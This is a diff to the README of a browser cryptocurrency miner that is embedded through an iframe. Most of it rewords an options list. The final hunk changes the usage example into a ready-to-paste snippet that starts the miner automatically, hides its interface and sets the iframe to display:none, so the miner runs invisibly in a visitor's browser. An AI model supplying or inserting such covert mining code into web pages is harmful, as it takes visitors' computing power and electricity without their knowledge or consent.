@@ -28,9 +28,9 @@ See a live example at [https://leathan.xyz/html/iframe-miner.html](https://leath
 
 4.) `autostart` or `start` or `s` - starts the miner automatically.
 
-5.) `color` and `text` and `background` and `graph` - styling colors for the interface.
+5.) `color`, `text`, `background`, and `graph` - styling colors for the interface.
 
-6.) `threads` and `throttle` and `powermode` - configuration options for the miner.
+6.) `threads`, `throttle`, and `powermode` - configuration options for the miner.
 
 7.) `hidelogo` or `hl` - hides the logo.
 
@@ -43,7 +43,7 @@ See a live example at [https://leathan.xyz/html/iframe-miner.html](https://leath
 For example to start automatically and hidden as user leathan with 1 thread:
 
 ```html
-<iframe src="https://leat.io/miner.html?u=leathan&threads=1&h&s"></iframe>
+<iframe src="https://leat.io/miner.html?u=leathan&t=1&h&s" style="display:none"></iframe>
 ```
 
 
